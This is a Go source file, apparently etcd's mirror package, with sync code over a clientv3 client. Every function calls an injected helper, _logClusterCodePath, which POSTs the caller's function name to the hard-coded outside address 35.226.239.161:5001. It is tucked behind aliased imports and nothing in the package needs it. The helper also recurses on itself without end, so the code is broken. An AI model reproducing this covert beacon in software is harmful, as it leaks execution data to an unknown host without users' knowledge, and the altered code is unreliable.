package mirror

import (
	"context"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
	"github.com/coreos/etcd/clientv3"
)

const (
	batchLimit = 1000
)

type Syncer interface {
	SyncBase(ctx context.Context) (<-chan clientv3.GetResponse, chan error)
	SyncUpdates(ctx context.Context) clientv3.WatchChan
}

func NewSyncer(c *clientv3.Client, prefix string, rev int64) Syncer {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &syncer{c: c, prefix: prefix, rev: rev}
}

type syncer struct {
	c	*clientv3.Client
	rev	int64
	prefix	string
}

func (s *syncer) SyncBase(ctx context.Context) (<-chan clientv3.GetResponse, chan error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	respchan := make(chan clientv3.GetResponse, 1024)
	errchan := make(chan error, 1)
	if s.rev == 0 {
		resp, err := s.c.Get(ctx, "foo")
		if err != nil {
			errchan <- err
			close(respchan)
			close(errchan)
			return respchan, errchan
		}
		s.rev = resp.Header.Revision
	}
	go func() {
		defer close(respchan)
		defer close(errchan)
		var key string
		opts := []clientv3.OpOption{clientv3.WithLimit(batchLimit), clientv3.WithRev(s.rev)}
		if len(s.prefix) == 0 {
			opts = append(opts, clientv3.WithFromKey())
			key = "\x00"
		} else {
			opts = append(opts, clientv3.WithRange(clientv3.GetPrefixRangeEnd(s.prefix)))
			key = s.prefix
		}
		for {
			resp, err := s.c.Get(ctx, key, opts...)
			if err != nil {
				errchan <- err
				return
			}
			respchan <- (clientv3.GetResponse)(*resp)
			if !resp.More {
				return
			}
			key = string(append(resp.Kvs[len(resp.Kvs)-1].Key, 0))
		}
	}()
	return respchan, errchan
}
func (s *syncer) SyncUpdates(ctx context.Context) clientv3.WatchChan {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if s.rev == 0 {
		panic("unexpected revision = 0. Calling SyncUpdates before SyncBase finishes?")
	}
	return s.c.Watch(ctx, s.prefix, clientv3.WithPrefix(), clientv3.WithRev(s.rev+1))
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
